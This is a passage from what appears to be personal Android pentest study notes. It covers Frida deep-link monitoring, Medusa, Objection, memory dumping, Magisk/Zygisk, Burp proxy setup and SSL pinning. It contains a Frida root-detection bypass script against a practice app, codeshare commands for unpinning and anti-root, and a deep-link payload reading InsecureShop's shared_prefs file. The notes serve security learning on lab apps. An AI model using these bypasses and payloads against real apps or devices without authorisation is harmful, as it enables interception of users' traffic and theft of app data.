});</code></pre><p id="ffa3d286-bfbd-4d40-b8f5-f493afc123cb" class="">This script will to monitor the deep links across the system.</p><p id="8459faf7-4ca2-4319-8343-6a3ba48e8ffc" class="">Find the pid of the system_server:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="add62cbf-93ac-42a4-8d9a-a2117a3ec144" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">rosy:/ $ ps -A | grep -i system_server

system        1680   917 5040652 241828 SyS_epoll_wait      0 S system_server</code></pre><p id="d6c041fd-5e1f-499c-b429-ff0617a0e65a" class="">Now we can attach to the service using this command</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="10b59ba0-780b-4743-a123-79279193552d" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">➜   frida -U -p  1680 -l deeplink3.js
          ____
         / _  |   Frida 16.0.10 - A world-class dynamic instrumentation toolkit
        | (_| |
         &gt; _  |   Commands:
        /_/ |_|       help      -&gt; Displays the help system
        . . . .       object?   -&gt; Display information about &#x27;object&#x27;
        . . . .       exit/quit -&gt; Exit
        . . . .
        . . . .   More info at &lt;https://frida.re/docs/home/&gt;
        . . . .
        . . . .   Connected to Redmi 5 (id=b35097cf7d25)
     [Redmi 5::PID::1680 ]-&gt; [*] Intent.getData() was called
     [*] Activity: com.android.fileexplorer.FileExplorerTabActivity
     [*] Action: android.intent.action.MAIN
     [-] No data supplied.
     [*] Intent.getData() was called
     [*] Activity: unknown
     [*] Action: android.intent.action.VIEW
     [*] Data
     - Scheme:   content://
     - Host:     /com.mi.android.globalFileexplorer.myprovider
     [*] Intent.getData() was called
     [*] Activity: unknown
     [*] Action: android.intent.action.VIEW
     [*] Data
     - Scheme:   content://
     - Host:     /com.mi.android.globalFileexplorer.myprovider
     [*] Intent.getData() was called
     [*] Activity: unknown
     [*] Action: android.intent.action.VIEW
     [*] Data
     - Scheme:   insecureshop://
     - Host:     /com.insecureshop
     - Params:   url=file:///data/data/com.insecureshop/shared_prefs/Prefs.xml
     [*] Intent.getData() was called
     [*] Activity: unknown
     [*] Action: android.intent.action.TIME_TICK
     [-] No data supplied.</code></pre><p id="97449d1a-fe36-4783-93d4-fefad2cf74db" class="">With this script, we can monitor deep links across systems and gain a comprehensive understanding of application functioning, and how we as attackers can exploit it</p></div></details></div></details></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0"><a href="http://Medusa.py">Medusa.py</a> for Frida scripts</summary><div class="indented"><p id="cf833540-91aa-4da8-beb6-c275b057d0ff" class=""><a href="https://github.com/Ch0pin/medusa.git">https://github.com/Ch0pin/medusa.git</a></p><p id="95a031b1-f630-4e45-842d-e3b1da76d372" class="">
</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f4bd9545-7d69-4087-abee-886b338185bf" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">reset
show all # to show all modules in Medusa</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="83293994-4889-402a-8990-6edb54c4b90d" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">use [[MODULE NAME]] #e.g. use file_system/shared_preferences</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="aa8e136b-26ef-41f4-bfef-e2e14e1d85f9" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">run -f [[PACKAGE NAME]] #e.g. run -f infosecadventures.allsafe</code></pre><p id="053c00c4-c14a-48e2-9619-8c387026259f" class="">the above example starts monitoring the APK if it stored anything in shared prefrences</p><p id="3fd4d225-d115-47f0-b41e-e1a2ced802ef" class="">
</p><p id="8b93b8e3-793c-47ef-9d02-36ad59a53f0d" class="">
</p></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Objection</summary><div class="indented"><p id="61436454-fb9c-4fa4-8966-6a261c7a7420" class="">Similar to Medusa, also based on Frida and communicate through Frida server.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="06244d3c-ff68-41fb-a9df-7b60578e6f8f" class="code"><code class="language-JavaScript">objection -g  [[Package_Name]]  explore

# android [[Choose]]</code></pre><p id="4503c697-c1f7-4e50-ba27-6b94ecd359d2" class="">
</p></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Memory Dumping</summary><div class="indented"><figure id="ae2b2ae9-95f3-4e4c-b48d-668f19cf551b"><div class="source">https://github.com/Nightbringer21/fridump</div></figure><h3 id="a831053e-bbb6-4d44-9fa8-6199925cf7a8" class="">Objection Memory Dump</h3><figure id="6d1fa6b2-f7b5-467b-b4cc-3297b11a99e9" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2078.png"><img style="width:462px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2078.png"/></a></figure><p id="a14e26e9-c6f9-49f5-a39b-27a0c309b129" class="">…# <code>memory search [[String]] --string</code> to dump specefic strings</p><figure id="5112bc6e-1f8b-4212-81a5-e3a47eb863dd" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2079.png"><img style="width:548px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2079.png"/></a></figure><p id="77d37ebe-20e6-47bd-a3cb-f55c2e7b958f" class="">This hex value is displayed in the left to each string</p><figure id="d20c1aa2-506d-4ced-b547-e0b06c78ba82" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2080.png"><img style="width:324px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2080.png"/></a></figure><p id="97f7bf29-89af-405b-9fde-73c86a89fb3d" class="">Or you can dump all memory:<br/><br/></p><figure id="26ad2288-e645-4011-83dd-6603cbec5895" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2081.png"><img style="width:421px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2081.png"/></a></figure></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Root detection</summary><div class="indented"><p id="738f5419-b20e-4f84-8edc-7416513e3f4d" class="">to bypass this function Boolean validition:</p><figure id="d81e4085-2537-4ce5-a72b-91bf9243868f" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2082.png"><img style="width:377px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2082.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f6ef841e-4a48-4406-b1d3-d1bd16e306bf" class="code"><code class="language-Java" style="white-space:pre-wrap;word-break:break-all">Java.perform(function(){ //34an function mwgoda

var rootCls = Java.use(&quot;sg.vantagepoint.a.c&quot;);

rootCls.a.implementation = function () {
console.log(&quot;Check A bypassed&quot;);
return false;}

rootCls.b.implementation = function () {
console.log(&quot;Check B bypassed&quot;);
return false;}

rootCls.c.implementation = function () {
console.log(&quot;Check C bypassed&quot;);
return false;}

});</code></pre><figure id="943e1976-26e3-4209-9640-9b01598bd6a8" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2083.png"><img style="width:384px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2083.png"/></a></figure><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">root automation batching tools with Frida:</summary><div class="indented"><figure id="b1d28c79-cc6c-4bb3-8483-d35d4806cfbd"><a href="https://codeshare.frida.re/" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">Frida CodeShare</div><div class="bookmark-description">&quot;If I have seen further, it is by standing on the shoulders of giants.&quot;     -Sir Issac Newton</div></div><div class="bookmark-href"><img src="https://codeshare.frida.re/static/images/favicon.ico" class="icon bookmark-icon"/>https://codeshare.frida.re/</div></div></a></figure><p id="821c395f-a909-498d-8984-2782242df3fc" class="">and use ready payloads like:</p><h3 id="36252917-d274-46dc-baea-3be917604ea7" class="">Project: fridantiroot</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="cd100638-252a-4819-988a-40f2f2b3dcf5" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all"> frida -U --codeshare dzonerzy/fridantiroot -f YOUR_BINARY</code></pre><p id="188bf46c-6ae7-4a98-9603-35ff7fb2ba14" class=""><code>-U</code> for USB connections</p></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Magisk &amp; Zyjisk in root and bypassing root detetction</summary><div class="indented"><p id="a597db20-16ad-49d1-b8ee-e316b9e16495" class="">Nowadays, there is something called <code>systemless root</code> , it makes the modifications at boot time in ROM and it didn’t modify in the file system like the old method. <code><strong><mark class="highlight-blue">Magisk</mark></strong></code> with <code><strong><mark class="highlight-blue">Zygisk</mark></strong></code> version is used to make <code>systemless root</code> </p><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="aad38504-7ab5-4d10-9612-1a20f63c2a77"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">There are two types of keys in android, its related to how android kernel signed while its compiling at the beginning <ol type="1" id="ad03aa89-d724-4c6e-9714-cb276321abe3" class="numbered-list" start="1"><li><strong><mark class="highlight-yellow">test keys</mark></strong> → means its signed by android <mark class="highlight-yellow">AOSP keys (Android Open Source Project)</mark>, its public keys and known to anyone so the installed apps signed with this test keys. so this means that you can change or hijack system applications without detection. So finding a test keys may be an indication that this kernel has been hijacked.</li></ol><ol type="1" id="4dc8860d-00af-467d-93cf-d257baa07855" class="numbered-list" start="2"><li><strong><mark class="highlight-yellow">release keys </mark></strong><strong>→ </strong>its preferable that the kernel should sign with special release key with the access of the developer or manufacturer only </li></ol></div></figure><ul id="4feb44f5-fad3-45c7-83b4-3344dc2e6988" class="toggle"><li><details open=""><summary><mark class="highlight-blue"><strong>Magisk</strong></mark></summary><p id="7a137d8c-da31-4729-9266-4850ac16d930" class="">Its <mark class="highlight-yellow">System less root</mark> way. Its an <mark class="highlight-yellow">easy way to install and uninstall root</mark> on devices. Its specially made to bypass<strong><mark class="highlight-yellow"> safety net</mark></strong> (its the official implementation from google in root detection).</p><ul id="612f9dbb-b031-4876-9b7f-4f98d0909a78" class="toggle"><li><details open=""><summary><mark class="highlight-blue"><strong>Safety net</strong></mark></summary><p id="c645698f-12ee-40e6-8964-465f656e3206" class=""><code>SafetyNet</code> is an <mark class="highlight-yellow">Android API</mark> that<mark class="highlight-yellow"> provides a set of services and creates profiles of devices</mark> according to <mark class="highlight-yellow">software and hardware information</mark>. This profile is then <mark class="highlight-yellow">compared</mark> to a <mark class="highlight-yellow">list of accepted device models that have passed Android compatibility testing.</mark> Google <a href="https://developers.google.com/android/reference/com/google/android/gms/safetynet/SafetyNet">recommends</a> using the feature as &quot;an additional in-depth defense signal as part of an anti-abuse system&quot;.</p><p id="740fd035-7ed6-448c-8151-5b09b49fd298" class="">When you call this API, SafetyNet downloads a binary package containing the device validation code provided from Google, and the code is then dynamically executed via reflection. An <a href="https://koz.io/inside-safetynet/">analysis by John Kozyrakis</a> showed that SafetyNet also attempts to <mark class="highlight-yellow">detect whether the device is rooted</mark>, but exactly how that&#x27;s determined is unclear.</p><p id="c838752c-272f-4116-81dd-f244ebab84c9" class="">To use the API, an app may call the <code>SafetyNetApi.attest</code> method (which returns a JWS message with the <em>Attestation Result</em>) and then check the following fields:</p><ul id="700fe2ab-719d-4a04-b7ff-daaceb8f515a" class="bulleted-list"><li style="list-style-type:disc"><code>ctsProfileMatch</code>: If &#x27;true&#x27;, the device profile matches one of Google&#x27;s listed devices.</li></ul><ul id="a857b66a-61be-4e34-98eb-a03ce96df33f" class="bulleted-list"><li style="list-style-type:disc"><code>basicIntegrity</code>: If &#x27;true&#x27;, the device running the app likely hasn&#x27;t been tampered with.</li></ul><ul id="06bf4bb4-5939-47d3-8019-13a71828d6df" class="bulleted-list"><li style="list-style-type:disc"><code>nonces</code>: To match the response to its request.</li></ul><ul id="18c3a480-4a16-4c0c-8162-510c67186af5" class="bulleted-list"><li style="list-style-type:disc"><code>timestampMs</code>: To check how much time has passed since you made the request and you got the response. A delayed response may suggest suspicious activity.</li></ul><ul id="bff2e8ea-8bf0-49ce-a2ac-80ad590f4a46" class="bulleted-list"><li style="list-style-type:disc"><code>apkPackageName</code>, <code>apkCertificateDigestSha256</code>, <code>apkDigestSha256</code>: Provide information about the APK, which is used to verify the identity of the calling app. These parameters are absent if the API cannot reliably determine the APK information.</li></ul><p id="965a9a29-8a9d-4615-bca3-a9ee6663b7be" class=""><a href="https://github.com/OWASP/owasp-mastg/blob/master/Document/0x05j-Testing-Resiliency-Against-Reverse-Engineering.md">https://github.com/OWASP/owasp-mastg/blob/master/Document/0x05j-Testing-Resiliency-Against-Reverse-Engineering.md</a></p></details></li></ul><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="f5de31c7-8cc7-41c7-b9e5-da9bc6f4fa4e"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">Any application installed from google play store can call the safety net API and check for <code>ctsProfile</code> </div></figure><p id="bb078a21-1744-4908-b301-a2d1b68d4054" class="">Recently, Magisk has a new version called <code>Zygisk</code> and this injects the Magisk app inside the <code>zygot process</code> (this process is responsible for <mark class="highlight-yellow">spawning </mark>the applications in android) of the android directly. This makes the bypassing of root detection more efficient and stealthy.</p><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="77457985-5d35-49ee-972e-846182d7fc3f"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">Magisk app has a feature called hide Magisk app and this allows you to make the appears as another one.</div></figure></details></li></ul><p id="a9f8bd24-8358-4dae-b029-84720c86679e" class="">Magisk ⇒ safe Root batching and the ability of returning back is easy by just un installing it through the app</p><p id="199ae2bf-0196-44c9-98d4-a813171f7593" class="">SaftyNet API is for google play installed app, check is the device is rooted</p><p id="28f2ca0a-2880-4ee4-8d1b-8571ba9eb94a" class="">can be checked in play store settings</p><figure id="70fc0edf-681b-40d7-bd67-62760caf1d57" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2084.png"><img style="width:192px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2084.png"/></a></figure><p id="b84b855c-0afa-4b69-8909-59afcbe8bf68" class="">You should clear play store Cache before checking, if u r not certified , try to bypass root detection done by SaftyNet</p><p id="6068435d-c3c4-4726-b2bb-82d2e737077f" class="">after Android 10, Root detection is harder since its based now more on hardware</p><p id="97fd0998-e0b8-4104-9a58-bf0386516b08" class=""><em><span style="border-bottom:0.05em solid"><strong>Zygisk :</strong></span></em> is what the Magisk developers call running Magisk in the Zygote Process of Android. </p><p id="9bdb544b-ab59-447b-bcf9-4e6ef2654d29" class="">The Zygote Process is the first process that the OS starts when it boots up, similar to PID 1 on other Linux-based operating systems. </p><p id="786d153f-6f2b-496e-9cac-8b7de0833511" class="">Since zygote starts first after system, it can hide root without sending data to apps.</p><p id="6c26e90b-68cc-448f-937a-8616cd70e47c" class="">Also it can bypass root detection to given Apps though Deny-List , you check app then restart</p><figure id="ca36b32f-cc8d-4008-80a6-dd5e4b4c869e" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2085.png"><img style="width:192px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2085.png"/></a></figure></div></details></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Adding Burp as a proxy for Android</summary><div class="indented"><figure id="286dc816-3844-49b3-bcee-e53d1e62110a" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2086.png"><img style="width:480px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2086.png"/></a></figure><figure id="b073cde8-4edf-4fea-bfdf-a820567c6f7b" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2087.png"><img style="width:480px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2087.png"/></a></figure><p id="eb292e2f-6071-4bcf-b4b3-5df87e25c3a9" class="">this would work for http , but in case of https </p><p id="9323f2cc-d997-49cc-8cbf-b0e6a0d3dc91" class="">we will need to download the certificate of Burp in Android first</p><figure id="c908e38c-56b0-44f2-ad4d-06ed89f8df01" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2088.png"><img style="width:480px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2088.png"/></a></figure><p id="321b8097-c8cb-4816-931f-1204ddb052c1" class="">Change the certificate to cer rather than der </p><figure id="5032a92d-9e1e-4b8b-908e-dc57cbb38adc" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2089.png"><img style="width:480px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2089.png"/></a></figure><p id="b7d3ca0b-52c7-4134-879c-ec8de31cc9fa" class="">now install it from Android settings </p><figure id="586a928b-574a-4839-9210-bda9b71bccbb" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2090.png"><img style="width:480px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2090.png"/></a></figure></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Trust Manager</summary><div class="indented"><figure id="f59938fd-8a99-4d56-8087-a7b67b4cc0b6" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2091.png"><img style="width:528px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2091.png"/></a></figure><p id="1fb7dc2a-476a-408d-b4a0-136725389416" class=""><em><span style="border-bottom:0.05em solid"><strong>Trust Manager and SSL Context Initialization:</strong></span></em><em><span style="border-bottom:0.05em solid"><br/><br/></span></em>In Android, the Trust Manager is responsible for <mark class="highlight-pink">managing certificates</mark> and <mark class="highlight-pink">deciding which certificates should be trusted </mark>when establishing secure connections using SSL/TLS. If a trust manager is compromised or not properly implemented, it can lead to security vulnerabilities.</p><p id="bda09594-a13f-4835-a076-3f95e453efb9" class=""><em><span style="border-bottom:0.05em solid"><strong>Bypassing Trust Managers with Frida:</strong></span></em><em><span style="border-bottom:0.05em solid"><br/><br/></span></em>It can be used to <mark class="highlight-pink">intercept function calls, including those related to SSL/TLS connections</mark>. If an application is<mark class="highlight-pink"> not using certificate pinning and relies solely on the default trust manager</mark>, a Frida script could potentially <mark class="highlight-pink">intercept </mark>and <mark class="highlight-pink">modify SSL/TLS traffic</mark>.</p><p id="023ca98d-61c9-4eb5-9171-9e882c899a1f" class="">but Frida script won’t run on a Majisk or jygisk rooted device as they intercept traffic to bypass root detection:</p><figure id="4407fd1e-ad91-48e8-8678-694198a4bdd4" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2092.png"><img style="width:528px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2092.png"/></a></figure><p id="c14db259-2dd5-424f-872e-afa1c31161a8" class="">this above won’t run in old Majisk ⇒ therefore to run Frida scripts while Majsik we use Frida on an already running process </p><p id="a69bd3f5-dabd-47a9-b6ad-507a22947bb6" class=""><em><span style="border-bottom:0.05em solid"><strong>script below, is used instead: </strong></span></em></p><figure id="238561c0-0f5b-4263-b6bf-cd75cc00118b" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2093.png"><img style="width:576px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2093.png"/></a></figure><p id="4fb90d0d-5e0c-48ca-9d48-7be148df7718" class="">this script is a solution but it <mark class="highlight-pink">wont always go well from the first trial</mark>, You need to retry until u catch the right time before initialization of the Trust manager</p><figure id="77b966a7-9cce-40c5-b9f0-ab7508ee434a" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2094.png"><img style="width:768px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2094.png"/></a></figure><figure id="26488a45-0438-4c7c-9a4a-03bc2a13877d" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2095.png"><img style="width:576px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2095.png"/></a></figure><p id="257675d3-e005-416f-b846-94f11f3e1a5f" class="">as shown it failed in first trial, but<mark class="highlight-pink"> succeeded in the 2nd</mark></p><p id="ade72138-6ba7-489b-a678-26784360317f" class="">but the new ver5sion of Jyisk fixed this issue</p><p id="cb6501c8-0882-4cfe-897d-952d0fab0a83" class="">just use then </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4d1392e3-fe86-4c0d-b3c3-cb3396dc1c8f" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">frida -U -l hook.js -p [[PID]] </code></pre><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0"><strong>Bypass SSL Pinning with Frida codeshare:</strong></summary><div class="indented"><p id="29bd5f9e-501e-4656-814f-0cbe596404c8" class="">Now, we can bypass SSL pinning by utilizing a Frida script. The following Frida command will unpin SSL certificates for a specified app:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7631493a-04a8-4824-a3e8-dbcfa8e5c23c" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">frida --codeshare akabe1/frida-multiple-unpinning -U -f &lt;appname&gt;</code></pre></div></details></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">SSL Pinning</summary><div class="indented"><p id="fa0fd573-cfd2-430c-b096-e79f93b48e1b" class="">In dealing with APKs, Burp would cause issues, since the APK dont see the Burp as a valid Certificate pinned to it form the server, and cause the connection not to be established correctly </p><p id="f59e692a-8841-42f6-872c-c84d623b51ee" class="">this is due to SSL Pinning</p><figure id="458f94e1-3820-4c4f-9fce-892f3e51df00" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2096.png"><img style="width:672px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2096.png"/></a></figure><p id="5053d466-f909-4858-ae5f-815f1570ef48" class="">This issue is due : when we install a Cert, its stored in User certificates not System Cert. and it’s not recommended to store it 